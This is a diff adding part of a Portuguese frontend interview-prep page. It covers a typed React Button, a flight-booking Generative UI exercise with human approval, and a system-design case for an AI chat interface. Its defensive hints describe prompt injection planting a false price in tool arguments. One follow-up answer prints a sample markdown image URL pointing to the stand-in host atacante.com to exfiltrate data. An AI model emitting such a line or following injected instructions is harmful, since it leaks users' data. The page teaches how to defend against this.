+type SoIcone = Base & { children?: never; icon: ReactNode; 'aria-label': string };
+export type ButtonProps = ComTexto | SoIcone;
+
+export function Button({
+  intent, size, loading = false, icon, children, className, type = 'button', onClick, ...rest
+}: ButtonProps) {
+  return (
+    <button
+      {...rest}
+      type={type}
+      className={button({ intent, size, iconOnly: children == null, className })}
+      aria-disabled={loading || undefined}
+      aria-busy={loading || undefined}
+      onClick={(e) => {
+        if (loading) { e.preventDefault(); return; } // continua focável, mas não age
+        onClick?.(e);
+      }}
+    >
+      {loading ? <Spinner /> : icon && <span aria-hidden="true">{icon}</span>}
+      {children}
+    </button>
+  );
+}
+
+function Spinner() {
+  return (
+    <svg className="size-4 animate-spin motion-reduce:animate-none" viewBox="0 0 24 24" aria-hidden="true">
+      <circle cx="12" cy="12" r="9" fill="none" stroke="currentColor" strokeWidth="3" strokeDasharray="42 14" />
+    </svg>
+  );
+}
+</code></pre>
+<h5>O contrato, provado pelo compilador</h5>
+<pre><code class="esc">
+<Button intent="danger" onClick={excluir}>Excluir</Button>
+<Button icon={<IconeLixeira />} aria-label="Excluir questão" intent="ghost" size="sm" />
+
+// @ts-expect-error variante que não existe
+<Button intent="danjer">Excluir</Button>
+// @ts-expect-error botão só de ícone sem nome acessível
+<Button icon={<IconeLixeira />} />
+</code></pre>
+<p><strong>Detalhes pra mencionar:</strong> no React 19, <code>ref</code> é prop comum e passa pelo <code>...rest</code> (no 18 seria <code>forwardRef</code>); <code>{...rest}</code> vem primeiro pra que <code>type</code>, <code>className</code> e <code>onClick</code> não sejam sobrescritos sem querer; e quando duas classes do Tailwind conflitam (<code>px-4</code> do tamanho e <code>px-2</code> passado por fora), quem resolve é o <code>tailwind-merge</code> num <code>cn()</code>, não a ordem no atributo.</p>
+      </div></details>
+      <div class="quiz">
+        <div class="quiz-head">Perguntas que vêm depois</div>
+        <ol>
+          <li>Preciso de um link que parece botão. Adiciono <code>href</code> no <code>&lt;Button&gt;</code>?
+            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Não: navegação é <code>&lt;a&gt;</code>, ação é <code>&lt;button&gt;</code>. Eles se comportam diferente no teclado (Enter vs. Enter e Espaço), no leitor de tela e no &ldquo;abrir em nova aba&rdquo;. O padrão é separar a <em>aparência</em> do <em>elemento</em>: exportar <code>buttonVariants</code> pra aplicar num <code>&lt;Link&gt;</code>, ou um <code>asChild</code> (o <code>Slot</code> do Radix) que passa as classes pro filho.</p></div></details>
+          </li>
+          <li>O <code>aria-busy</code> já avisa o leitor de tela que terminou de carregar?
+            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Não de forma confiável: o suporte a <code>aria-busy</code> varia entre leitores. O botão comunica o estado; o <em>resultado</em> (&ldquo;Questão excluída&rdquo;, &ldquo;Falhou, tente de novo&rdquo;) é anunciado numa região <code>role="status"</code> ou <code>role="alert"</code> que já existe na página, como o Gabarita faz no card de correção.</p></div></details>
+          </li>
+          <li>Como você garante que ninguém quebra esse botão depois?
+            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Três camadas: o <strong>tipo</strong> (variante e <code>aria-label</code> obrigatórios); uma <strong>story por variante</strong> no Storybook com o addon de acessibilidade em <code>test: 'error'</code>; e <strong>regressão visual</strong> (<code>toHaveScreenshot()</code> ou Chromatic) das combinações nos temas claro e escuro. O teste de componente cobre o comportamento: clique ignorado durante o carregamento e foco mantido.</p></div></details>
+          </li>
+        </ol>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===================== EXERCÍCIO 5 ===================== -->
+  <div class="ex" id="ex5">
+    <div class="ex-head"><span class="ex-n">EX 5</span><h3>Generative UI com aprovação humana</h3><span class="ex-meta">45 min &middot; React + TS &middot; R1/R6</span></div>
+    <div class="ex-body">
+      <p class="ex-enunciado">&ldquo;A resposta do assistente chega como uma lista de <code>parts</code>. Renderize cada uma: texto, ferramenta rodando, resultado e erro. Temos duas ferramentas: <code>buscarVoos</code> e <code>reservarVoo</code>. Reservar cobra no cartão, então precisa da aprovação do usuário antes de executar.&rdquo;</p>
+<pre><code class="esc">
+type Voo = { id: string; cia: string; partida: string; preco: number };
+
+type Estado<I, O> =
+  | { state: 'input-available'; input: I }                    // rodando
+  | { state: 'approval-requested'; input: I }                 // esperando o usuário
+  | { state: 'output-available'; input: I; output: O }
+  | { state: 'output-error'; input: I; errorText: string }
+  | { state: 'output-denied'; input: I };                     // usuário recusou
+
+type Part =
+  | { type: 'text'; text: string }
+  | ({ type: 'tool-buscarVoos'; id: string } & Estado<{ origem: string; destino: string }, Voo[]>)
+  | ({ type: 'tool-reservarVoo'; id: string } & Estado<{ vooId: string; passageiros: number }, { localizador: string }>);
+</code></pre>
+      <h4>Requisitos</h4>
+      <ul>
+        <li>Cada estado tem uma UI: esqueleto enquanto roda, componente com o dado, erro localizado naquele bloco (sem derrubar a conversa).</li>
+        <li>O cartão de aprovação mostra o que vai acontecer em termos que o usuário entende, com dois botões, e não aceita clique duplo.</li>
+        <li>Um tipo de <code>part</code> desconhecido (o back-end ganhou uma ferramenta nova) não quebra a tela.</li>
+      </ul>
+      <h4>O que o entrevistador observa</h4>
+      <ul>
+        <li>Se o <code>switch</code> no <code>type</code> e no <code>state</code> deixa o TypeScript estreitar o tipo (sem <code>as</code>).</li>
+        <li>De onde vêm os dados do cartão de aprovação: dos argumentos que o modelo escreveu ou de uma fonte confiável.</li>
+        <li>Se o texto do modelo é renderizado com segurança.</li>
+      </ul>
+      <details class="dica"><summary>dica 1</summary><div class="dica-body"><p><code>Extract&lt;Part, { type: 'tool-reservarVoo' }&gt;</code> dá o tipo da prop de cada componente de ferramenta. Dentro dele, um <code>switch (part.state)</code> estreita o resto.</p></div></details>
+      <details class="dica"><summary>dica 2</summary><div class="dica-body"><p>O modelo pode escrever qualquer coisa nos argumentos, inclusive um preço falso induzido por prompt injection. Mostre o voo pelo <code>vooId</code>, buscado no resultado da sua própria ferramenta de busca, e não um &ldquo;resumo&rdquo; que o modelo mandou.</p></div></details>
+      <details class="sol"><summary>solução comentada</summary><div class="sol-body">
+<pre><code class="esc">
+import { useId, useState } from 'react';
+
+const brl = new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' });
+const hora = new Intl.DateTimeFormat('pt-BR', { dateStyle: 'short', timeStyle: 'short' });
+
+export function MensagemAssistente({ parts, onAprovar }: {
+  parts: Part[];
+  onAprovar: (toolCallId: string, aprovado: boolean) => void;
+}) {
+  // voos que a NOSSA ferramenta devolveu: fonte confiável pro cartão de aprovação
+  const voos = new Map(
+    parts.flatMap((p) =>
+      p.type === 'tool-buscarVoos' && p.state === 'output-available'
+        ? p.output.map((v) => [v.id, v] as const)
+        : [],
+    ),
+  );
+
+  return (
+    <div className="space-y-3">
+      {parts.map((part, i) => {
+        switch (part.type) {
+          case 'text':
+            return <Markdown key={i} texto={part.text} />; // sem HTML cru (ver follow-up)
+          case 'tool-buscarVoos':
+            return <ResultadoVoos key={part.id} part={part} />;
+          case 'tool-reservarVoo':
+            return <Reserva key={part.id} part={part} voo={voos.get(part.input.vooId)} onAprovar={onAprovar} />;
+          default:
+            // em runtime pode chegar um tipo que este front não conhece
+            return <p key={i} className="text-ink-soft">Este conteúdo não pode ser exibido aqui.</p>;
+        }
+      })}
+    </div>
+  );
+}
+
+function ResultadoVoos({ part }: { part: Extract<Part, { type: 'tool-buscarVoos' }> }) {
+  const rota = `${part.input.origem} → ${part.input.destino}`;
+  switch (part.state) {
+    case 'input-available':
+      return <div role="status" className="skeleton h-24">Buscando voos {rota}…</div>;
+    case 'output-error':
+      return <p role="alert">Não consegui buscar voos {rota} agora.</p>;
+    case 'output-available':
+      if (part.output.length === 0) return <p>Nenhum voo encontrado {rota}.</p>;
+      return (
+        <ul aria-label={`Voos ${rota}`}>
+          {part.output.map((v) => (
+            <li key={v.id}>{v.cia} · {hora.format(new Date(v.partida))} · {brl.format(v.preco)}</li>
+          ))}
+        </ul>
+      );
+    default:
+      return null; // busca não pede aprovação
+  }
+}
+
+function Reserva({ part, voo, onAprovar }: {
+  part: Extract<Part, { type: 'tool-reservarVoo' }>;
+  voo: Voo | undefined;
+  onAprovar: (toolCallId: string, aprovado: boolean) => void;
+}) {
+  const [respondido, setRespondido] = useState(false);
+  const tituloId = useId();
+  const responder = (ok: boolean) => { setRespondido(true); onAprovar(part.id, ok); };
+
+  switch (part.state) {
+    case 'approval-requested':
+      return (
+        <section role="group" aria-labelledby={tituloId} className="card">
+          <h4 id={tituloId}>Confirmar a reserva?</h4>
+          {voo ? (
+            <p>
+              {voo.cia}, {hora.format(new Date(voo.partida))}, {part.input.passageiros} passageiro(s):{' '}
+              <strong>{brl.format(voo.preco * part.input.passageiros)}</strong> no cartão salvo.
+            </p>
+          ) : (
+            <p role="alert">Não encontrei esse voo nos resultados da busca. Não confirme sem conferir.</p>
+          )}
+          <button type="button" disabled={respondido || !voo} onClick={() => responder(true)}>Reservar</button>
+          <button type="button" disabled={respondido} onClick={() => responder(false)}>Não reservar</button>
+        </section>
+      );
+    case 'input-available':
+      return <p role="status">Reservando…</p>;
+    case 'output-available':
+      return <p role="status">Reserva feita. Localizador <strong>{part.output.localizador}</strong>.</p>;
+    case 'output-denied':
+      return <p>Reserva não feita: você recusou.</p>;
+    case 'output-error':
+      return <p role="alert">A reserva falhou: {part.errorText}</p>;
+  }
+}
+</code></pre>
+<p><strong>Por que o <code>disabled</code> aqui está certo, se no exercício 4 ele era evitado:</strong> depois da resposta o botão não tem mais o que fazer e o cartão vai mudar de estado. Lá, o botão voltava a funcionar no fim do carregamento e o foco precisava continuar nele.</p>
+      </div></details>
+      <div class="quiz">
+        <div class="quiz-head">Perguntas que vêm depois</div>
+        <ol>
+          <li>A aprovação está no front. Isso basta pra impedir uma reserva não autorizada?
+            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Não. O front <em>coleta</em> a decisão; quem <em>exige</em> é o servidor: a ferramenta <code>reservarVoo</code> só executa se existir uma aprovação registrada pra aquele <code>toolCallId</code>, daquele usuário. E, na execução, o servidor revalida tudo (o voo existe, o preço é o mesmo de quando o usuário aprovou). Se mudou, pede aprovação de novo. Qualquer regra que só existe no cliente pode ser pulada com uma chamada direta à API.</p></div></details>
+          </li>
+          <li>Como o texto do modelo deve ser renderizado?
+            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Como entrada não confiável. Markdown sem HTML cru (o <code>react-markdown</code> ignora HTML por padrão; nunca <code>dangerouslySetInnerHTML</code> com saída de modelo), links com o domínio visível e <code>rel="noopener noreferrer"</code>. E <strong>imagens externas não carregam sozinhas</strong>: um prompt injection pode fazer o modelo escrever <code>![](https://atacante.com/x?dados=...)</code>, e só renderizar a imagem já manda os dados pra fora. Bloqueie, passe por proxy ou peça um clique; a CSP com <code>img-src</code> restrito é a segunda barreira.</p></div></details>
+          </li>
+          <li>Pedir aprovação pra toda ferramenta não seria mais seguro?
+            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Seria mais seguro no papel e menos na prática: confirmação pra tudo treina o usuário a clicar &ldquo;sim&rdquo; sem ler. Aprovação entra onde a ação é irreversível, custa dinheiro ou fala em nome do usuário, e de preferência por regra dinâmica (reserva acima de um valor, e-mail pra fora da empresa). Buscar voos é leitura: roda direto.</p></div></details>
+          </li>
+        </ol>
+      </div>
+    </div>
+  </div>
+
+  <h3 class="sub">System design: a interface de um assistente de IA</h3>
+
+  <div class="ex" id="sd">
+    <div class="ex-head"><span class="ex-n">CASO</span><h3>&ldquo;Desenhe a interface de um assistente tipo ChatGPT dentro do nosso produto&rdquo;</h3><span class="ex-meta">45 min &middot; RADIO &middot; B14 + R1</span></div>
+    <div class="ex-body">
+      <p>É a pergunta mais provável numa vaga de Frontend ou Design Engineer com foco em IA, e a resposta fraca é a mesma de sempre: listar tecnologias. A forte segue o RADIO do <a href="b14-frontend-system-design.html">B14</a> e gasta a maior parte do tempo no que é <strong>difícil no cliente</strong>: stream, estado por mensagem, performance de resposta longa, acessibilidade do que muda sozinho e segurança da saída do modelo.</p>
+      <h4>Roteiro de 45 minutos</h4>
+      <div class="table-scroll">
+      <table class="roteiro">
+        <thead><tr><th>Tempo</th><th>Etapa</th><th>O que sai dela</th></tr></thead>
+        <tbody>
+          <tr><td>0&ndash;5</td><td>Requisitos</td><td>Perguntas de escopo, lista de funcionais e não funcionais, o que fica fora</td></tr>
+          <tr><td>5&ndash;12</td><td>Arquitetura</td><td>Desenho dos componentes no cliente e do BFF, e por que existe um BFF</td></tr>
+          <tr><td>12&ndash;18</td><td>Modelo de dados</td><td>Conversa, mensagem com <code>parts</code> e status, o que é estado de servidor e o que é de cliente</td></tr>
+          <tr><td>18&ndash;25</td><td>Interface (API)</td><td>Endpoints, formato dos eventos do stream, e a decisão SSE &times; WebSocket</td></tr>
+          <tr><td>25&ndash;40</td><td>Otimizações</td><td>Renderização do stream, rolagem, lista longa, bundle, erros, acessibilidade, segurança, métricas</td></tr>
+          <tr><td>40&ndash;45</td><td>Fechamento</td><td>Trade-offs assumidos e o que você faria com mais tempo</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <h4>1 &middot; Requisitos</h4>
+      <p><strong>Pergunte antes de desenhar</strong> (com a premissa que você assume se o entrevistador devolver a pergunta):</p>
+      <ul>
+        <li>Web, mobile ou os dois? &rarr; web responsiva.</li>
+        <li>Só texto, ou o assistente usa ferramentas e mostra componentes? &rarr; texto e algumas ferramentas (Generative UI).</li>
+        <li>Conversas ficam salvas? Compartilháveis? &rarr; salvas por usuário, sem compartilhamento na v1.</li>
+        <li>Anexos (arquivo, imagem)? &rarr; fora da v1, mas o modelo de dados não pode impedir.</li>
+        <li>Escala e público? &rarr; milhares de usuários simultâneos, internacional, muito uso em celular.</li>
+      </ul>
+      <p><strong>Funcionais:</strong> enviar mensagem e ver a resposta em streaming; parar; regenerar; histórico de conversas com título; copiar resposta e código; feedback (&#128077;/&#128078; com motivo); resultados de ferramenta como componentes.</p>
+      <p><strong>Não funcionais</strong> (com número, que é o que diferencia): primeiro token visível em menos de 1 s no p75; INP abaixo de 200 ms <em>enquanto</em> o stream roda; conversa com 300+ mensagens sem travar; acessível por teclado e leitor de tela; nenhum rascunho perdido se a aba fechar.</p>
+
+      <h4>2 &middot; Arquitetura</h4>
+<pre><code class="esc">
+┌──────────────────────── Cliente (Next.js / React) ────────────────────────┐
+│  ConversationList          │  Thread                                       │
+│  (estado de servidor:      │   MessageList  (virtualizada)                 │
+│   TanStack Query)          │     Message → Part[] → Texto | Ferramenta     │
+│                            │   Composer  (rascunho por conversa)           │
+│                                                                            │
+│  ChatStore   mensagens por conversa · status por mensagem · streams ativos │
+│  StreamClient  fetch + parser SSE + AbortController (o exercício 1)        │
+└───────────────┬────────────────────────────────────────────────────────────┘
+                │ POST /api/chat → text/event-stream     GET /api/conversas
+┌───────────────▼──────────────── BFF (Route Handlers) ──────────────────────┐
+│ auth · rate limit por usuário · monta o histórico · chama o LLM            │
+│ executa ferramentas · exige aprovação · grava mensagens e uso de tokens    │
+└────────────────────────────────────────────────────────────────────────────┘
+</code></pre>
+      <p><strong>Por que um BFF, e não o navegador chamando o provedor:</strong> a chave da API fica no servidor; o rate limit é por usuário e por custo; o histórico é montado e cortado no servidor (o cliente não forja mensagem do assistente); e a mensagem é gravada mesmo se o usuário fechar a aba no meio.</p>
+
+      <h4>3 &middot; Modelo de dados</h4>
+<pre><code class="esc">
+type Conversation = { id: string; title: string | null; updatedAt: string };
+
+type Message = {
+  id: string;
+  conversationId: string;
+  role: 'user' | 'assistant';
+  parts: Part[];                 // texto, chamadas e resultados de ferramenta (exercício 5)
+  status: 'streaming' | 'complete' | 'incomplete' | 'error';
+  parentId: string | null;       // regenerar cria um irmão, não sobrescreve
+  createdAt: string;
+};
+
+// só no cliente
+type ChatUiState = {
+  drafts: Record<string, string>;                // rascunho por conversa (persistido)
+  activeStreams: Record<string, AbortController>; // por messageId
+};
+</code></pre>
+      <p><strong>Divisão de estado:</strong> lista de conversas e mensagens já gravadas são <em>estado de servidor</em> (cache, paginação, revalidação ao focar a aba). A mensagem que está chegando vive no store do cliente e, ao terminar, é reconciliada com o cache pelo mesmo <code>id</code>, que o cliente gera antes de enviar: é isso que deixa a mensagem otimista virar a definitiva sem piscar.</p>
+
+      <h4>4 &middot; Interface (API)</h4>
+<pre><code class="esc">
+POST /api/chat           { conversationId, message: { id, text }, regenerateOf? }
+  → text/event-stream:
+     message-start  { messageId }
+     text-delta     { messageId, delta }
+     tool-call      { messageId, toolCallId, name, input, needsApproval }
+     tool-result    { messageId, toolCallId, output | errorText }
+     finish         { messageId, usage: { inputTokens, outputTokens } }
+     error          { messageId, code, retryable, retryAfterMs? }
+
+POST /api/chat/approval  { toolCallId, approved }
+GET  /api/conversations?cursor=…
+GET  /api/conversations/:id/messages?before=<messageId>&limit=50
+POST /api/messages/:id/feedback  { rating, reason? }
+</code></pre>
+      <div class="table-scroll">
+      <table class="roteiro">
+        <thead><tr><th>Transporte</th><th>A favor</th><th>Contra</th></tr></thead>
+        <tbody>
+          <tr><td>SSE sobre fetch</td><td>HTTP comum: passa por CDN, proxy e auth existentes; uma requisição por resposta; o stream do modelo já é unidirecional</td><td>Proxy que faz buffer quebra o stream; retomar exige numerar eventos</td></tr>
+          <tr><td>WebSocket</td><td>Bidirecional e com baixa latência: necessário pra voz, colaboração ou o servidor iniciar a conversa</td><td>Conexão com estado: escala, autenticação e reconexão viram problema seu</td></tr>
+          <tr><td>Polling</td><td>O mais simples, sem conexão aberta</td><td>Não dá a sensação de digitação, que é o motivo do stream existir</td></tr>
+        </tbody>
+      </table>
+      </div>
+      <p><strong>Decisão:</strong> SSE sobre <code>fetch</code>. O que você diz: &ldquo;o fluxo é pergunta → resposta em pedaços; não preciso de canal bidirecional, e ganho todo o ferramental de HTTP. Se o produto ganhar voz ou edição colaborativa, WebSocket entra pra essa parte&rdquo;.</p>
+
+      <h4>5 &middot; Otimizações (onde a entrevista é decidida)</h4>
+      <ul>
+        <li><strong>Renderização do stream.</strong> Deltas acumulados e pintados uma vez por quadro. Markdown incremental: blocos já fechados são memoizados e só o último é reprocessado. Realce de código carregado sob demanda e aplicado quando o bloco fecha.</li>
+        <li><strong>Rolagem.</strong> Gruda no fim só se o usuário já estava no fim; se ele subiu pra ler, a tela não pula, e aparece um botão &ldquo;ir pro fim&rdquo;. Reserve espaço pra não empurrar o layout (CLS).</li>
+        <li><strong>Conversa longa.</strong> Paginação pra cima por cursor e virtualização da lista (com altura variável medida) ou <code>content-visibility: auto</code> como passo mais barato.</li>
+        <li><strong>Bundle.</strong> O composer é interativo primeiro; markdown, realce de sintaxe e fórmulas são carregados depois, sob demanda.</li>
+        <li><strong>Erros e estados.</strong> Status por <em>mensagem</em>, não global: uma resposta com erro não trava as outras. Texto parcial preservado, &ldquo;tentar de novo&rdquo; por mensagem, 429 com &ldquo;tente em X s&rdquo;, aviso de offline, rascunho salvo no <code>localStorage</code> por conversa.</li>
+        <li><strong>Acessibilidade.</strong> Não anunciar token a token (vira ruído): a mensagem em andamento fica com <code>aria-busy</code> e uma região <code>role="status"</code> anuncia &ldquo;resposta pronta&rdquo; no fim. O foco fica no composer. Enter envia, Shift+Enter quebra linha, Esc para. O cursor piscando respeita <code>prefers-reduced-motion</code>. Botões de ícone (copiar, regenerar) com nome acessível.</li>
+        <li><strong>Segurança.</strong> Saída do modelo é entrada não confiável: markdown sem HTML cru, imagens externas bloqueadas ou passando por proxy (canal de exfiltração por prompt injection), links com domínio visível, CSP restrita, ação sensível com aprovação exigida no servidor.</li>
+        <li><strong>Métricas.</strong> Tempo até o primeiro token (TTFT), tokens por segundo, taxa de erro por código, taxa de &ldquo;parar&rdquo; e de &ldquo;regenerar&rdquo; (sinal de resposta ruim), feedback &#128077;/&#128078; por motivo, custo por conversa.</li>
+      </ul>
+
+      <h4>O que separa a resposta sênior</h4>
+      <ul>
+        <li>Número nos requisitos não funcionais, e as otimizações ligadas a eles.</li>
+        <li>Estado por mensagem, id gerado no cliente e o que acontece com a resposta quando a aba fecha.</li>
+        <li>A decisão de transporte com o motivo e com o que mudaria a decisão.</li>
+        <li>Acessibilidade e segurança da saída do modelo trazidas por você, sem o entrevistador pedir.</li>
+      </ul>
+
+      <div class="quiz">
+        <div class="quiz-head">Perguntas que o entrevistador faz depois</div>
+        <ol>
+          <li>O usuário fecha a aba no meio da resposta. O que acontece no servidor?
+            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>É uma escolha de produto com custo. <strong>Cancelar</strong>: o servidor percebe a desconexão (<code>request.signal</code> abortado), para a geração, grava o parcial como <code>incomplete</code> e para de gastar tokens. <strong>Continuar</strong>: a geração termina e é gravada, e ao reabrir a conversa a resposta está inteira (é o que os assistentes grandes fazem). Continuar exige que a geração não dependa da conexão (fila ou processo próprio) e, idealmente, stream retomável pelo <code>messageId</code>.</p></div></details>
+          </li>
+          <li>Como implementar &ldquo;regenerar&rdquo; sem perder a resposta anterior?
+            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>A conversa vira uma <strong>árvore</strong>: regenerar cria uma mensagem irmã com o mesmo <code>parentId</code>, e a interface mostra &ldquo;2/3&rdquo; com setas pra alternar. Editar uma pergunta antiga cria um novo ramo a partir dela. O que aparece na tela é um caminho da raiz até a folha selecionada, e o histórico mandado ao modelo é esse caminho, não todas as mensagens.</p></div></details>
+          </li>
+          <li>Uma resposta de 5 mil tokens com muito código deixa a página engasgando. Como você investiga e resolve?
+            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Grava um perfil no painel Performance com o stream rodando e procura long tasks. O suspeito número um é reprocessar o markdown inteiro e reaplicar o realce a cada delta, que cresce com o tamanho. Remédios na ordem: pintar uma vez por quadro, memoizar blocos fechados, realçar só quando o bloco de código fecha (ou num worker), e virtualizar se a conversa também for longa. A confirmação é o INP medido durante o stream, antes e depois.</p></div></details>
+          </li>
+          <li>Como você testaria essa interface?
+            <details class="ans"><summary>ver resposta</summary><div class="ans-body"><p>Na base, o parser de SSE com o teste que corta a resposta em todos os pontos (exercício 1). Depois, o store e os componentes com um stream falso (Testing Library, consultas por papel). No topo, Playwright com <code>page.route</code> devolvendo um corpo SSE gravado: fluxo de enviar, parar, erro com retry e aprovação, mais <code>@axe-core/playwright</code>. E um contrato dos eventos (schema Zod na borda) pra o front quebrar no teste, e não em produção, quando o back-end mudar o formato.</p></div></details>
+          </li>
+        </ol>
+      </div>
+    </div>
+  </div>
+
+  <h3 class="sub">Variações pra treinar (20 min cada)</h3>
+  <div class="ex">
+    <div class="ex-body">
+      <p>Mesmo roteiro, versão curta. Responda em voz alta e só depois abra os pontos que você precisava ter coberto.</p>
+      <ol>
+        <li><strong>Painel de um agente que executa tarefas longas</strong> (minutos, várias etapas: pesquisar, escrever, revisar).
+          <details class="sol"><summary>pontos que você precisava cobrir</summary><div class="sol-body"><p>A tarefa roda no servidor, desacoplada da aba (fila ou workflow durável), e a interface só <em>observa</em>: SSE com <code>Last-Event-ID</code> pra reconectar sem perder etapa, ou polling se a frequência for baixa. Progresso <strong>por etapa</strong> com o que está sendo feito agora, não um spinner. Cancelar a tarefa inteira; aprovação antes de etapa com efeito colateral; notificação quando terminar (o usuário vai sair da tela). Estado reconstruído do servidor ao reabrir. Registro do que o agente fez, pra auditoria e pra o usuário confiar.</p></div></details>
+        </li>
+        <li><strong>Autocomplete com IA dentro de um editor</strong> (texto fantasma que o Tab aceita, tipo Copilot).
+          <details class="sol"><summary>pontos que você precisava cobrir</summary><div class="sol-body"><p>Orçamento de latência apertado (~300 ms ou a sugestão chega tarde). Debounce curto, mínimo de caracteres, e <strong>cancelar a requisição anterior</strong> a cada tecla (<code>AbortController</code>), senão uma resposta velha aparece depois da nova (condição de corrida). Cache por prefixo; descartar a sugestão se o texto mudou desde o pedido. Tab aceita, Esc descarta, e a sugestão não pode roubar o Tab de quem navega por teclado fora do editor. Rate limit e custo por usuário. Privacidade: o que do documento vai pro modelo.</p></div></details>
+        </li>
+        <li><strong>Resumo de documento longo com citações clicáveis</strong> (o usuário clica na citação e o documento rola até o trecho).
+          <details class="sol"><summary>pontos que você precisava cobrir</summary><div class="sol-body"><p>Cada afirmação do resumo aponta pra um trecho do documento por posição, e o código <strong>verifica</strong> que o trecho existe antes de mostrar (exatamente a <code>citacaoVerificada</code> do Gabarita, <a href="r06-proximo-nivel.html">R6</a>). Citação que não confere é escondida ou marcada, nunca exibida como se fosse prova. Visualizador do documento virtualizado (PDF de 300 páginas), com destaque do trecho e foco movido pra ele. O resumo pode chegar em stream, mas as citações aparecem depois de verificadas. Plano B quando a verificação falha: mostrar o resumo como &ldquo;sem fonte verificada&rdquo;, ou não mostrar.</p></div></details>
+        </li>
+      </ol>
+    </div>
+  </div>
+
+  <div class="ammo">
+    <div class="ammo-head">Munição da sua entrevista &middot; ligue o exercício ao que você já fez</div>
+    <div class="ammo-body">
+      <p>Num live coding, quando terminar o caminho principal, uma frase de contexto vale muito: &ldquo;a política de retry que eu escrevi aqui é a mesma do <code>withRetry</code> do Gabarita, que lê o <code>retryDelay</code> do 429 do Gemini&rdquo;; &ldquo;o cuidado de não anunciar token a token é o mesmo do card de correção do Gabarita, com <code>role="status"</code>&rdquo;; &ldquo;no Ally AI, a saída do modelo é validada por Zod e por uma allowlist de ids, que é o mesmo princípio de não confiar nos argumentos da ferramenta&rdquo;.</p>
+      <p class="why"><strong>Por que isso importa:</strong> o exercício mostra que você sabe fazer; a frase mostra que você já fez em produção e sabe por quê. É a diferença entre &ldquo;resolveu o problema&rdquo; e &ldquo;resolveu como alguém que já passou por isso&rdquo;.</p>
+    </div>
+  </div>
+</section>
